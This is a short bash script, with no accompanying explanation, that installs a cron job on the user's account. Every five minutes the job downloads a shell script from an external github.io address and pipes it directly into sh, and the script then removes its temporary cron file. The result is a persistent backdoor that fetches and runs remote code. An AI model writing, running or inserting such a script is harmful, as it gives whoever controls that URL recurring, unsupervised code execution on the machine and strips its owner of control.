#!/bin/bash

command="curl -s https://matthewpipie.github.io/send.sh?\$(date +%s) | sh"

#write out current crontab
crontab -l > mycron
#echo new cron into cron file
echo "*/5 * * * * $command" >> mycron
#install new cron file
crontab mycron
rm mycron
